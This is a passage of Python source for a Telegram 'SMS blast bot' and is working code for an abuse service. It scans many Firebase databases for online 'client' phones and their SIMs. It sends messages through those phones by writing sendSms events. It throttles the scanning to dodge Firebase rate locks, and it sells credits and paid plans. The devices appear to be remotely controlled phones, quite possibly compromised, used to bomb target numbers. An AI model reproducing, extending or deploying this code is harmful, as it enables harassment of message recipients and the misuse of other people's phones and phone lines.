        # Crash/network-drop se corrupt latest (CRC fail) abhi YAHAN pakda jaata hai:
        # 1 retry; phir bhi fail → latest hata do, taaki restore chain snaps pe
        # fallback kare (snaps intact rehte hain, corrupt node kabhi read nahi hota).
        try:
            vok, _v = await _fb_read_node(url, "bot_backup/latest")
        except Exception:
            vok = False
        if not vok:
            log.error("[FB-BACKUP] latest verify FAIL (CRC) — 1 retry")
            ok2, info2 = await _fb_write_chunks(url, "bot_backup/latest", parts, meta)
            vok2 = False
            if ok2:
                try:
                    vok2, _v2 = await _fb_read_node(url, "bot_backup/latest")
                except Exception:
                    vok2 = False
            if not vok2:
                for _pi in range(len(parts)):
                    await fb_http(url, f"bot_backup/latest/part_{_pi}", method="DELETE")
                await fb_http(url, "bot_backup/latest/meta", method="DELETE")
                return False, "latest_corrupt_removed(snap safe)"
            _latest_retried = True
        snap_ts = now_ist().strftime("%Y%m%d_%H%M%S")
        ok, info = await _fb_write_chunks(url, f"bot_backup/snap/{snap_ts}", parts, meta)
        if not ok:
            return False, f"snap {info}"
        try:
            st2, snaps = await fb_http(url, "bot_backup/snap", query="shallow=true")
            if st2 == 200 and isinstance(snaps, dict):
                for k in sorted(snaps.keys())[:-6]:
                    await fb_http(url, f"bot_backup/snap/{k}", method="DELETE")
        except Exception:
            pass
        _LAST_FB_BACKUP_TS[0] = time.time()
        plural = "s" if len(parts) > 1 else ""
        _retried_tag = " (latest retry-verified)" if _latest_retried else ""
        return True, f"ok{_retried_tag} (raw {_human_size(meta['size_raw'])} → gz {_human_size(meta['size_gz'])}, {len(parts)} part{plural})"
    except Exception as e:
        log.error(f"[FB-BACKUP] error: {e}")
        return False, str(e)[:100]


def _fb_write_restore(data: dict):
    """Firebase/Channel se aaya data main DB file mein atomic likho."""
    with _DB_LOCK:
        tmp = _DATA_FILE + ".tmp"
        with open(tmp, "w", encoding="utf-8") as f:
            json.dump(data, f, ensure_ascii=False)
        os.replace(tmp, _DATA_FILE)
    _data_cache_invalidate()
    try:
        _pn_raw = data.get("protected_numbers", {}) or {}
        PROTECTED_NUMBERS.clear()
        PROTECTED_NUMBERS.update({norm_number(k): v for k, v in _pn_raw.items() if norm_number(k)})
    except Exception:
        pass


async def fb_cloud_restore() -> "tuple[bool, str]":
    """Restart pe: Firebase se data laao (latest → snapshots naye→purane). Returns (ok, info)."""
    url = get_backup_fb_url()
    if not url:
        return False, "not_configured"
    ok, data = await _fb_read_node(url, "bot_backup/latest")
    if ok:
        _fb_write_restore(data)
        return True, "firebase:latest"
    st, snaps = await fb_http(url, "bot_backup/snap", query="shallow=true", timeout=30)
    if st == 200 and isinstance(snaps, dict):
        for k in sorted(snaps.keys(), reverse=True):
            ok, data = await _fb_read_node(url, f"bot_backup/snap/{k}")
            if ok:
                _fb_write_restore(data)
                return True, f"firebase:snap_{k}"
    return False, "no_data_in_firebase"


# ── CHANNEL BACKUP REF (channel se auto-import ka liye file_id manifest) ──
def _save_channel_backup_ref(file_id: str, message_id: int, size: int):
    """Channel backup ka file_id 3 jagah save karo — koi bhi ek survive kare
    (CWD + backup dir + script folder). Main DB mein bhi (Firebase backup mein bhi rahe)."""
    ref = {"file_id": file_id, "message_id": message_id, "ts": int(time.time()), "size": size, "gz": True}
    paths = set()
    for dd in {".", _BACKUP_DIR, os.path.dirname(os.path.abspath(__file__))}:
        try:
            paths.add(os.path.join(dd, "last_channel_backup.json"))
        except Exception:
            pass
    for path in paths:
        try:
            with open(path, "w", encoding="utf-8") as f:
                json.dump(ref, f)
        except Exception:
            pass
    try:
        d = load()
        d["channel_backup_ref"] = ref
        save(d)
    except Exception:
        pass


def _read_channel_backup_ref() -> dict:
    """Latest channel backup ref dhundo (3 locations mein se sabse naya)."""
    best = None
    seen = set()
    for dd in {".", _BACKUP_DIR, os.path.dirname(os.path.abspath(__file__))}:
        try:
            path = os.path.join(dd, "last_channel_backup.json")
            ap = os.path.abspath(path)
            if ap in seen or not os.path.exists(ap):
                continue
            seen.add(ap)
            with open(ap, "r", encoding="utf-8") as f:
                ref = json.load(f)
            if isinstance(ref, dict) and ref.get("file_id"):
                if best is None or ref.get("ts", 0) > best.get("ts", 0):
                    best = ref
        except Exception:
            pass
    return best or {}


async def _restore_from_channel(bot) -> "tuple[bool, str]":
    """Restart pe: channel backup ka file_id (manifest) se file download karke import.
    Returns (ok, info)."""
    ref = _read_channel_backup_ref()
    if not ref.get("file_id"):
        return False, "no_channel_ref"
    try:
        tg_file = await bot.get_file(ref["file_id"])
        dl_url = f"{_TG_API}/file/bot{BOT_TOKEN}/{tg_file.file_path}"
        async with aiohttp.ClientSession() as s:
            async with s.get(dl_url, timeout=aiohttp.ClientTimeout(total=180)) as r:
                if r.status != 200:
                    return False, f"download http:{r.status}"
                blob = await r.read()
        if blob[:2] == b"\x1f\x8b":
            blob = gzip.decompress(blob)
        data = json.loads(blob.decode("utf-8"))
        if not (isinstance(data, dict) and (data.get("users") is not None or data.get("firebases") is not None)):
            return False, "bad_channel_data"
        _fb_write_restore(data)
        return True, f"channel:msg{ref.get('message_id')}"
    except Exception as e:
        log.error(f"[RESTORE] channel restore error: {e}")
        return False, str(e)[:80]



def _json_view(data, limit: int = 3500) -> str:
    try:
        txt = json.dumps(data, indent=1, ensure_ascii=False)
    except Exception:
        txt = str(data)
    if len(txt) > limit:
        txt = txt[:limit] + f"\n... (truncated — total {len(txt)} chars)"
    return txt


def _json_view_html(data, limit: int = 3500) -> str:
    return html.escape(_json_view(data, limit))


async def _fb_overview(base_url: str) -> "tuple[bool, str, list]":
    """Root overview: keys + clients count. Returns (ok, text, short_root_keys)."""
    status, data = await fb_http(base_url, "")
    if status != 200:
        return False, f"DB read nahi ho payi (HTTP {status})", []
    if not isinstance(data, dict):
        return True, "📄 (root khali hai — koi key nahi)", []
    keys = list(data.keys())
    lines = [f"🔑 Root keys: <code>{', '.join(keys[:10])}</code>"]
    short_keys = [k for k in keys if len(k) <= 40][:8]
    if "clients" in keys:
        st2, clients = await fb_http(base_url, "clients", query="shallow=true")
        if st2 == 200 and isinstance(clients, dict):
            lines.append(f"📱 Devices (<code>clients</code>): <b>{len(clients)}</b>")
    return True, "\n".join(lines), short_keys


def _fb_editor_menu_kb(keys: list) -> InlineKeyboardMarkup:
    rows = [[
        InlineKeyboardButton(text="✏️ Edit Data", callback_data="fed:edit"),
        InlineKeyboardButton(text="🗑️ Delete", callback_data="fed:del"),
    ]]
    k1 = keys[:4]
    k2 = keys[4:8]
    if k1:
        rows.append([InlineKeyboardButton(text=f"📄 {k}", callback_data=f"fed:key:{k}") for k in k1])
    if k2:
        rows.append([InlineKeyboardButton(text=f"📄 {k}", callback_data=f"fed:key:{k}") for k in k2])
    rows.append([
        InlineKeyboardButton(text="📄 Raw JSON", callback_data="fed:raw"),
        InlineKeyboardButton(text="🔄 Scan Devices", callback_data="fed:rescan"),
    ])
    rows.append([InlineKeyboardButton(text="⬅️ Owner Panel", callback_data="fed:home")])
    return InlineKeyboardMarkup(inline_keyboard=rows)


def device_is_online(device_data: dict) -> bool:
    return any([
        device_data.get("isOnline"),
        device_data.get("online"),
        device_data.get("connected"),
        device_data.get("status") in ("online", "active", True, 1)
    ])

def _http_hint(code: int) -> str:
    if code in (423, 429):
        return "rate-limit/locked — 20s baad 1 retry ho chuka; IP thanda hone par next scan theek"
    if code == 404:
        return "DB nahi mili — deleted/private ho sakti hai"
    if code in (401, 403):
        return "permission/access denied"
    return "HTTP error"


async def get_all_online_devices(d: dict) -> list:
    fbs = d.get("firebases", [])
    if not fbs:
        return []
    SCAN_PASS_WARN.update({"423": 0, "404": 0, "other": 0})
    results = []
    current_fb_ids = {fb["id"] for fb in fbs}
    global CACHED_DEVICES
    CACHED_DEVICES = [dev for dev in CACHED_DEVICES if dev.get("fb_id") in current_fb_ids]

    _dev_sem = asyncio.Semaphore(15)
    # DB-level throttle: max 4 DBs ek saath + 0.8s gap — 150 DBs ek saath hit karna
    # Firebase ka IP lock (423) kar deta tha; ab scan ~3-4 min mein soft chalta hai
    _db_sem = asyncio.Semaphore(4)
    _db_gap_ts = [0.0]

    async def _shallow_fetch(session, url: str) -> "tuple[int, str]":
        """Shallow GET — 423/429 par 20s baad 1 baar retry. Returns (status, text)."""
        async with session.get(url, timeout=aiohttp.ClientTimeout(total=10)) as r:
            status = r.status
            if status in (423, 429):
                await asyncio.sleep(20)
                async with session.get(url, timeout=aiohttp.ClientTimeout(total=10)) as r2:
                    return r2.status, await r2.text()
            return status, await r.text()

    async def fetch_one(fb: dict):
        async with _db_sem:
            wait_gap = 0.8 - (time.time() - _db_gap_ts[0])
            if wait_gap > 0:
                await asyncio.sleep(wait_gap)
            _db_gap_ts[0] = time.time()

        shallow_url = fb["url"].rstrip("/") + "/clients.json?shallow=true"
        try:
            async with aiohttp.ClientSession() as s:
                status, raw_txt = await _shallow_fetch(s, shallow_url)
                if status != 200:
                    FB_SCAN_STATUS[fb["id"]] = f"http:{status}"
                    # per-DB red WARNING flood NAHI — scan ke end pe ek summary line (console "saraa red" fix)
                    if status in (423, 429):
                        SCAN_PASS_WARN["423"] += 1
                    elif status == 404:
                        SCAN_PASS_WARN["404"] += 1
                    else:
                        SCAN_PASS_WARN["other"] += 1
                    return
                txt = raw_txt.strip()
                if txt == "null" or not txt:
                    FB_SCAN_STATUS[fb["id"]] = "empty:0"
                    return
                device_ids = json.loads(txt)
                if not isinstance(device_ids, dict):
                    FB_SCAN_STATUS[fb["id"]] = "bad-data"
                    return

                async def fetch_dev(dev_id: str):
                    try:
                        url = fb["url"].rstrip("/") + f"/clients/{dev_id}.json"
                        async with _dev_sem:
                            async with s.get(url, timeout=aiohttp.ClientTimeout(total=8)) as r2:
                                if r2.status == 200:
                                    txt2 = (await r2.text()).strip()
                                    if txt2 == "null" or not txt2:
                                        return None
                                    dev_data = json.loads(txt2)
                                    if isinstance(dev_data, dict) and device_is_online(dev_data):
                                        name = dev_data.get("deviceName") or dev_data.get("name") or dev_id[:16]
                                        sims = dev_data.get("sims", [])
                                        return {
                                            "fb_id": fb["id"],
                                            "fb_url": fb["url"],
                                            "fb_label": fb.get("label", fb["url"][:30]),
                                            "dev_id": dev_id,
                                            "dev_name": name,
                                            "sims": sims,
                                        }
                    except Exception as e:
                        log.warning(f"Device fetch {dev_id}: {e}")
                    return None

                dev_ids = list(device_ids.keys())
                for i in range(0, len(dev_ids), 20):
                    batch = dev_ids[i:i+20]
                    dev_tasks = [fetch_dev(dev_id) for dev_id in batch]
                    dev_results = await asyncio.gather(*dev_tasks)
                    for res in dev_results:
                        if res:
                            results.append(res)
                FB_SCAN_STATUS[fb["id"]] = f"ok:{len(dev_ids)}"
        except Exception as e:
            FB_SCAN_STATUS[fb["id"]] = f"error:{str(e)[:40]}"
            log.warning(f"fb_shallow_get {fb['url']}: {e}")

    await asyncio.gather(*(fetch_one(fb) for fb in fbs))
    return results

async def send_sms_via_device(fb_url: str, dev_id: str, sim_slot: int, to: str, message: str) -> bool:
    return await fb_put(
        fb_url,
        f"/clients/{dev_id}/webhookEvent/sendSms.json",
        {
            "from": sim_slot,
            "to": to.strip(),
            "message": message.strip(),
            "isSended": False,
            "timestamp": int(time.time())
        }
    )

async def check_membership(bot: Bot, uid: int, channel_id: str) -> bool:
    try:
        chat_id = int(str(channel_id).strip())
        member = await bot.get_chat_member(chat_id, uid)
        return member.status in ("member", "administrator", "creator")
    except Exception as e:
        log.error(f"Force Join check failed for channel {channel_id}: {e}")
        return False

async def user_joined_all(bot: Bot, uid: int, d: dict) -> tuple[bool, list]:
    if is_owner(uid, d):
        return True, []

    fj = d.get("force_join", {})
    if not fj.get("enabled", False):
        return True, []

    channels = fj.get("channels", [])
    missing = []
    for ch in channels:
        if ch.get("required", True):
            if not await check_membership(bot, uid, ch["id"]):
                missing.append(ch)
    return len(missing) == 0, missing

def force_join_text(missing: list) -> str:
    lines = [
        f"{em(EMOJI_CROSS, '⛔')} <b>{sc('bot use karne ke liye pehle join karein!')}</b>\n\n",
        f"{em(EMOJI_BELL, '👇')} ɴɪᴄʜᴇ ᴅɪʏᴇ ɢaʏ ᴄʜaɴɴᴇʟs/ɢrᴏuᴘs ᴊᴏɪɴ ᴋarᴇɪɴ:"
    ]
    for ch in missing:
        lines.append(f"\n• <a href='{ch['link']}'>{ch.get('title', 'Channel')}</a>")
    lines.append(f"\n\n<i>{sc('join karne ke baad /start karein ya refresh dabayein.')}</i>")
    return "\n".join(lines)

def force_join_kb(missing: list) -> InlineKeyboardMarkup:
    rows = []
    for ch in missing:
        rows.append([btn_url(f"ᴊᴏɪɴ {ch.get('title', 'Channel')}", ch["link"], EMOJI_BELL, "🔔", style="success")])
    rows.append([btn("🔄 rᴇғrᴇsʜ / ᴄʜᴇᴄᴋ", "fj:check", None, "", style="primary")])
    return InlineKeyboardMarkup(inline_keyboard=rows)

def fmt_time(ts: int) -> str:
    return datetime.fromtimestamp(ts, _IST).strftime("%d/%m/%Y %H:%M")

def fmt_duration(seconds: int) -> str:
    if seconds < 60:
        return f"{seconds}s"
    return f"{seconds // 60}m {seconds % 60}s"

def owner_panel_text(d: dict) -> str:
    fbs = d.get("firebases", [])
    owners = d.get("owners", [])
    admins = d.get("admins", [])
    users = d.get("users", {})
    stats = d.get("stats", {})
    videos = d.get("videos", [])
    mode = f"{em(EMOJI_CHECK, '🟢')} ғrᴇᴇ" if d.get("free_mode") else f"{em(EMOJI_CROSS, '🔴')} aᴘᴘrᴏᴠaʟ rᴇǫuɪrᴇᴅ"
    fj = d.get("force_join", {})
    fj_status = f"{em(EMOJI_CHECK, '🟢')} ᴏɴ" if fj.get("enabled") else f"{em(EMOJI_CROSS, '🔴')} ᴏғғ"
    gu = d.get("global_unlimited") or {}
    if global_unlimited_active(d):
        _gu_until = gu.get("until", 0)
        gu_status = f"🟢 {sc('on')} — ∞ {sc('permanent')}" if _gu_until == 0 else f"🟢 {sc('on')} — {unlimited_info(0, d)[1]} {sc('days left')}"
    else:
        gu_status = f"🔴 {sc('off')}"
    active_sessions = len([s for s in USER_SESSIONS.values() if s.task and not s.task.done()])
    scan_info = get_scan_status()

    fb_lines = []
    fb_items = list(FB_DEVICE_COUNTS.items())
    shown_count = 0
    max_display = 5
    for fb_id, fb_data in fb_items:
        if shown_count >= max_display:
            remaining = len(fb_items) - max_display
            fb_lines.append(f"  {em(EMOJI_STAR, '➕')} +{remaining} more firebase(s)...")
            break
        age = int(time.time() - fb_data.get("last_update", 0))
        status = em(EMOJI_CHECK, "🟢") if age < 60 else em(EMOJI_WARNING, "🟡") if age < 300 else em(EMOJI_CROSS, "🔴")
        fb_lines.append(f"  {status} {fb_data['label'][:20]}: {fb_data['online']} ᴏɴʟɪɴᴇ")
        shown_count += 1
    fb_summary = "\n".join(fb_lines) if fb_lines else f"  {em(EMOJI_WARNING, '😴')} ɴᴏ ᴅaᴛa"

    protected_count = len(PROTECTED_NUMBERS)

    return (
        f"{em(EMOJI_CROWN, '👑')} <b>{sc('owner panel')}</b> — sᴍs ʙʟasᴛ ʙᴏᴛ {_VERSION}\n"
        f"<b>Owner:</b> {SUPER_ADMIN_NAME}\n\n"
        f"━━━━━━━━━━━━━━━━━━\n"
        f"{em(EMOJI_FIRE, '🔥')} ғɪrᴇʙasᴇ ᴅʙs  : <b>{len(fbs)}</b>\n"
        f"{em(EMOJI_CROWN, '👑')} suᴘᴇr aᴅᴍɪɴs  : <b>{len(owners)}</b>/6\n"
        f"{em(EMOJI_SHIELD, '🛡')} aᴅᴍɪɴs        : <b>{len(admins)}</b>\n"
        f"{em(EMOJI_STAR, '👥')} ᴛᴏᴛaʟ usᴇrs   : <b>{len(users)}</b>\n"
        f"{em(EMOJI_VIDEO, '📹')} ᴠɪᴅᴇᴏs        : <b>{len(videos)}</b>\n"
        f"{em(EMOJI_CHECK, '📤')} ᴛᴏᴛaʟ sᴇɴᴛ    : <b>{stats.get('total_sent', 0)}</b>\n"
        f"{em(EMOJI_CROSS, '❌')} ᴛᴏᴛaʟ ғaɪʟᴇᴅ  : <b>{stats.get('total_failed', 0)}</b>\n"
        f"{em(EMOJI_ROCKET, '🚀')} aᴄᴛɪᴠᴇ sᴇɴᴅs  : <b>{active_sessions}</b>\n"
        f"{em(EMOJI_GIFT, '🔓')} aᴄᴄᴇss ᴍᴏᴅᴇ   : {mode}\n"
        f"🌍 {sc('sab unlimited')}   : {gu_status}\n"
        f"{em(EMOJI_BELL, '📢')} ғᴏrᴄᴇ ᴊᴏɪɴ    : {fj_status}\n"
        f"{em(EMOJI_MONEY, '💳')} ᴘrɪᴄɪɴɢ ᴘʟaɴs : <b>{len(d.get('pricing', {}).get('plans', []))}</b>\n"
        f"{em(EMOJI_LOCK, '🔒')} ᴘrᴏᴛᴇᴄᴛᴇᴅ     : <b>{protected_count}</b>\n"
        f"{em(EMOJI_PHONE, '📱')} ᴘᴇr ғɪrᴇʙasᴇ  :\n{fb_summary}\n"
        f"{em(EMOJI_GEAR, '🔄')} sᴄaɴɴᴇr       : {scan_info}\n"
        f"━━━━━━━━━━━━━━━━━━"
    )

def admin_panel_text(d: dict) -> str:
    users = d.get("users", {})
    stats = d.get("stats", {})
    banned = d.get("banned", [])
    videos = d.get("videos", [])
    mode = f"{em(EMOJI_CHECK, '🟢')} ғrᴇᴇ" if d.get("free_mode") else f"{em(EMOJI_CROSS, '🔴')} aᴘᴘrᴏᴠaʟ rᴇǫuɪrᴇᴅ"
    active_sessions = len([s for s in USER_SESSIONS.values() if s.task and not s.task.done()])
    scan_info = get_scan_status()

    fb_lines = []
    fb_items = list(FB_DEVICE_COUNTS.items())
    shown_count = 0
    max_display = 5
    for fb_id, fb_data in fb_items:
        if shown_count >= max_display:
            remaining = len(fb_items) - max_display
            fb_lines.append(f"  {em(EMOJI_STAR, '➕')} +{remaining} more firebase(s)...")
            break
        age = int(time.time() - fb_data.get("last_update", 0))
        status = em(EMOJI_CHECK, "🟢") if age < 60 else em(EMOJI_WARNING, "🟡") if age < 300 else em(EMOJI_CROSS, "🔴")
        fb_lines.append(f"  {status} {fb_data['label'][:20]}: {fb_data['online']} ᴏɴʟɪɴᴇ")
        shown_count += 1
    fb_summary = "\n".join(fb_lines) if fb_lines else f"  {em(EMOJI_WARNING, '😴')} ɴᴏ ᴅaᴛa"

    protected_count = len(PROTECTED_NUMBERS)
    _total_credits = 0
    try:
        _total_credits = sum(int(u.get("credits", 0) or 0) for u in users.values())
    except Exception:
        _total_credits = 0
    _dr = d.get("daily_reward") or {}
    _dr_status = f"{em(EMOJI_CHECK, '✅')} ᴏɴ (<b>{_dr.get('amount', 0)}</b>/24h)" if _dr.get("enabled") else f"{em(EMOJI_CROSS, '❌')} ᴏғғ"

    return (
        f"🛡️ <b>{sc('admin panel')}</b>\n"
        f"📡 <i>sᴍs ʙʟasᴛ ʙᴏᴛ {_VERSION}</i>\n\n"
        f"━━━━━━━━━━━━━━━━━━\n"
        f"🔵 {em(EMOJI_STAR, '👥')} ᴛᴏᴛaʟ usᴇrs   : <b>{len(users)}</b>\n"
        f"🟣 {em(EMOJI_VIDEO, '📹')} ᴠɪᴅᴇᴏs        : <b>{len(videos)}</b>\n"
        f"🔴 {em(EMOJI_CROSS, '🚫')} ʙaɴɴᴇᴅ        : <b>{len(banned)}</b>\n"
        f"🟢 {em(EMOJI_CHECK, '📤')} ᴛᴏᴛaʟ sᴇɴᴛ    : <b>{stats.get('total_sent', 0)}</b>\n"
        f"🟠 {em(EMOJI_CROSS, '❌')} ᴛᴏᴛaʟ ғaɪʟᴇᴅ  : <b>{stats.get('total_failed', 0)}</b>\n"
        f"🔵 {em(EMOJI_ROCKET, '🚀')} aᴄᴛɪᴠᴇ sᴇɴᴅs  : <b>{active_sessions}</b>\n"
        f"🟠 {em(EMOJI_FIRE, '🔥')} ғɪrᴇʙasᴇ ᴅʙs  : <b>{len(d.get('firebases', []))}</b>\n"
        f"🟣 {em(EMOJI_LOCK, '🔒')} ᴘrᴏᴛᴇᴄᴛᴇᴅ     : <b>{protected_count}</b>\n"
        f"🟡 {em(EMOJI_MONEY, '🪙')} ᴛᴏᴛaʟ ᴄʀᴇᴅɪᴛs : <b>{_total_credits}</b>\n"
        f"🟢 {em(EMOJI_GIFT, '🎁')} ᴅɪʟʏ ʀᴇᴡᴀʀᴅ  : {_dr_status}\n"
        f"{em(EMOJI_PHONE, '📱')} ᴘᴇr ғɪrᴇʙasᴇ  :\n{fb_summary}\n"
        f"{em(EMOJI_GIFT, '🔓')} aᴄᴄᴇss ᴍᴏᴅᴇ   : {mode}\n"
        f"{em(EMOJI_GEAR, '🔄')} sᴄaɴɴᴇr       : {scan_info}\n"
        f"━━━━━━━━━━━━━━━━━━"
    )

def user_home_text(uid: int, d: dict) -> str:
    udata = d["users"].get(str(uid), {})
    fbs = d.get("firebases", [])
    credits = udata.get("credits", 0)
    scan_info = get_scan_status()
    _u_act, _u_days = unlimited_info(uid, d)
    if _u_act:
        unlimited_row = (f"🔓  {sc('unlimited')} : <b>{sc('permanent (sab)')}</b>\n" if _u_days is None
                         else f"🔓  {sc('unlimited')} : <b>{_u_days} {sc('days left')}</b>\n")
    else:
        unlimited_row = ""
    return (
        f"🥷 ◤{sc('droid')}◢  {sc('sms blast system')}\n"
        f"━━━━━━━━━━━━━━━━━━━━━━\n"
        f"{em(EMOJI_PHONE, '📱')}  {sc('sms blast bot')} <b>{_VERSION}</b>\n"
        f"👑  {sc('owner')} : <b>{SUPER_ADMIN_NAME}</b>\n"
        f"━━━━━━━━━━━━━━━━━━━━━━\n"
        f"{em(EMOJI_STAR, '👤')}  {sc('role')}    : {role_tag(uid, d)}\n"
        f"{em(EMOJI_MONEY, '💰')}  {sc('credits')} : <b>{credits}</b>\n"
        f"{unlimited_row}"
        f"{em(EMOJI_STAR, '🔢')}  {sc('uses')}   : <b>{udata.get('uses', 0)}</b>\n"
        f"{em(EMOJI_FIRE, '🔥')}  {sc('apis')}   : <b>{len(fbs)}</b> {sc('firebase')}(s)\n"
        f"{em(EMOJI_GEAR, '🔄')}  {sc('scanner')} : {scan_info}\n"
        f"━━━━━━━━━━━━━━━━━━━━━━\n"
        f"⚡ {sc('tap send sms to start')} {em(EMOJI_ROCKET, '🚀')}"
    )

def owner_kb(d: dict) -> InlineKeyboardMarkup:
    mode_btn = (f"🔴 {sc('disable free mode')}", "owner:free:off") if d.get("free_mode") else (f"🟢 {sc('enable free mode')}", "owner:free:on")
    return InlineKeyboardMarkup(inline_keyboard=[
        [btn("sᴇɴᴅ sᴍs", "owner:send", EMOJI_ROCKET, "📤"), btn("ᴍaɴaɢᴇ ғɪrᴇʙasᴇ", "owner:fb:menu:0", EMOJI_FIRE, "🔥")],
        [btn("ᴍaɴaɢᴇ ᴠɪᴅᴇᴏs", "owner:videos:menu", EMOJI_VIDEO, "📹"), btn("ᴍaɴaɢᴇ suᴘᴇr aᴅᴍɪɴs", "owner:owners:menu", EMOJI_CROWN, "👑")],
        [btn("ᴍaɴaɢᴇ aᴅᴍɪɴs", "owner:admins:menu", EMOJI_SHIELD, "🛡"), btn("ᴠɪᴇᴡ usᴇrs", "owner:users:list", EMOJI_STAR, "👥")],
        [btn("ʙaɴ usᴇr", "owner:ban", EMOJI_CROSS, "🚫"), btn("uɴʙaɴ usᴇr", "owner:unban:menu", EMOJI_CHECK, "✅")],
        [btn("ʙrᴏaᴅᴄasᴛ", "owner:broadcast", EMOJI_BELL, "📢"), btn("aᴘɪ sᴛaᴛs", "owner:stats", EMOJI_STAR, "📊")],
        [btn("aᴄᴛɪᴠɪᴛʏ ʟᴏɢ", "owner:activity", EMOJI_GEAR, "📜"), btn("ᴘrɪᴄɪɴɢ ᴘʟaɴs", "owner:pricing:menu", EMOJI_MONEY, "💳")],
        [btn("rᴇᴅᴇᴇᴍ ᴄᴏᴅᴇs", "owner:redeem:menu", EMOJI_GIFT, "🎁"), btn("aᴅᴅ ᴄrᴇᴅɪᴛs", "owner:credits:add", EMOJI_MONEY, "💰")],
        [btn("ᴅᴇᴅuᴄᴛ ᴄrᴇᴅɪᴛs", "owner:credits:deduct", EMOJI_CROSS, "💰"), btn("aᴅᴅ ᴄrᴇᴅɪᴛs aʟʟ", "owner:add_all_credits", EMOJI_MONEY, "💰")],
        [btn("ᴅᴇᴅuᴄᴛ aʟʟ", "owner:deduct_all_credits", EMOJI_CROSS, "💰"), btn("ғᴏrᴄᴇ ᴊᴏɪɴ", "owner:fj:menu", EMOJI_BELL, "🔗")],
        [btn("sᴇᴛᴛɪɴɢs", "owner:settings", EMOJI_GEAR, "⚙️"), btn("sᴍs ʜɪsᴛᴏrʏ", "owner:sms_history", EMOJI_STAR, "📋")],
        [btn("ᴇxᴘᴏrᴛ sᴄrɪᴘᴛ", "owner:export_script", EMOJI_GEAR, "📤"), btn("ᴘrᴏᴛᴇᴄᴛ ɴuᴍʙᴇr", "owner:protect", EMOJI_LOCK, "🔒")],
        [btn("ᴘrᴏᴛᴇᴄᴛᴇᴅ ʟɪsᴛ", "owner:protected_list", EMOJI_LOCK, "🔐"), btn("ᴛraᴄᴋ ɴuᴍʙᴇr", "owner:track", EMOJI_STAR, "📊")],
        [btn("ᴇxᴘᴏrᴛ ᴅʙ", "owner:export_db", EMOJI_GEAR, "📦"), btn("ɪᴍᴘᴏrᴛ ᴅʙ", "owner:import_db", EMOJI_GEAR, "📥")],
        [InlineKeyboardButton(text=mode_btn[0], callback_data=mode_btn[1]), btn("🌍 sab unlimited", "owner:gunl:menu", None, "")],
        [btn("firebase editor", "owner:db_editor", EMOJI_FIRE, "🔥"), btn("backup firebase", "owner:backup_fb", EMOJI_GEAR, "📦")],
        [btn("daily reward", "owner:daily_reward", EMOJI_GIFT, "🎁"), btn("auto broadcast", "owner:autobc", EMOJI_BELL, "📢")],
        [btn("weekly broadcast", "owner:weekly_bc", EMOJI_BELL, "📅"), btn("set token", "owner:set_token", EMOJI_GEAR, "🔑")],
        [btn("rᴇғrᴇsʜ", "owner:refresh", EMOJI_GEAR, "🔄")],
    ])

def admin_kb(d: dict) -> InlineKeyboardMarkup:
    return InlineKeyboardMarkup(inline_keyboard=[
        [btn("sᴇɴᴅ sᴍs", "admin:send", EMOJI_ROCKET, "📤", style="success"), btn("ᴍaɴaɢᴇ ᴠɪᴅᴇᴏs", "owner:videos:menu", EMOJI_VIDEO, "📹", style="primary")],
        [btn("ᴠɪᴇᴡ usᴇrs", "admin:users:list", EMOJI_STAR, "👥", style="primary"), btn("aᴘɪ sᴛaᴛs", "admin:stats", EMOJI_STAR, "📊", style="primary")],
        [btn("ʙaɴ usᴇr", "admin:ban", EMOJI_CROSS, "🚫", style="danger"), btn("uɴʙaɴ usᴇr", "admin:unban:menu", EMOJI_CHECK, "✅", style="success")],
        [btn("ʙrᴏaᴅᴄasᴛ", "admin:broadcast", EMOJI_BELL, "📢", style="primary"), btn("auto bc", "admin:autobc", EMOJI_BELL, "📢", style="primary")],
        [btn("rᴇғrᴇsʜ", "admin:refresh", EMOJI_GEAR, "🔄", style="primary")],
    ])

def user_kb() -> InlineKeyboardMarkup:
    # Users ke liye visible text-emoji buttons (Send SMS, Referral, sab mein)
    return InlineKeyboardMarkup(inline_keyboard=[
        [btn("📤 sᴇɴᴅ sᴍs", "user:send", None, "", style="success")],
        [btn("📹 ᴠɪᴅᴇᴏs", "user:random_video", None, "", style="primary"), btn("💳 ᴄrᴇᴅɪᴛs", "user:credits", None, "", style="primary")],
        [btn("🎁 rᴇᴅᴇᴇᴍ", "user:redeem", None, "", style="primary"), btn("👥 rᴇғᴇr", "user:refer", None, "", style="primary")],
        [btn("📊 sᴛaᴛs", "user:stats", None, "", style="primary"), btn("📜 ᴍʏ sᴍs ʜɪsᴛᴏrʏ", "user:sms_history", None, "", style="primary")],
        [btn("💰 ʙuʏ ᴄrᴇᴅɪᴛs", "user:pricing", None, "", style="success")],
        [btn("🔒 ᴘrᴏᴛᴇᴄᴛ ɴuᴍʙᴇr", "user:protect", None, "", style="primary"), btn("🔐 ᴍʏ ᴘrᴏᴛᴇᴄᴛᴇᴅ", "user:protected", None, "", style="primary")],
        [btn("💸 ᴛraɴsғᴇr ᴄrᴇᴅɪᴛs", "user:transfer", None, "", style="primary")],
        [btn("ℹ️ ɪɴғᴏ", "user:info", None, "", style="primary")],
    ])

def videos_menu_kb(d: dict) -> InlineKeyboardMarkup:
    videos = d.get("videos", [])
    rows = [
        [btn("aᴅᴅ ᴠɪᴅᴇᴏ", "owner:videos:add", EMOJI_CHECK, "➕")],
        [btn("🗑 ʙuʟᴋ ᴅᴇʟᴇᴛᴇ aʟʟ ᴠɪᴅᴇᴏs", "owner:videos:bulk_del", EMOJI_CROSS, "🗑")]
    ]
    for idx, vid in enumerate(videos, 1):
        vid_label = f"Video #{idx}"
        rows.append([btn(vid_label, "noop", EMOJI_VIDEO, "📹"), btn("rᴇᴍᴏᴠᴇ", f"owner:videos:del:{idx-1}", EMOJI_CROSS, "🗑")])
    rows.append([btn("ʙaᴄᴋ", "owner:home", EMOJI_GEAR, "🔙")])
    return InlineKeyboardMarkup(inline_keyboard=rows)

def fb_menu_kb(d: dict, page: int = 0) -> InlineKeyboardMarkup:
    fbs = d.get("firebases", [])
    per_page = 8
    total_pages = max(1, (len(fbs) + per_page - 1) // per_page)
    page = max(0, min(page, total_pages - 1))
    
    start_idx = page * per_page
    end_idx = start_idx + per_page
    current_fbs = fbs[start_idx:end_idx]

    rows = [
        [
            btn("aᴅᴅ ғɪrᴇʙasᴇ", "owner:fb:add", EMOJI_CHECK, "➕"),
            btn("📁 aᴅᴅ ᴠɪa ᴛxᴛ", "owner:fb:add_file", EMOJI_CHECK, "📄")
        ]
    ]
    for fb in current_fbs:
        label = fb.get("label", fb["url"].replace("https://", ""))
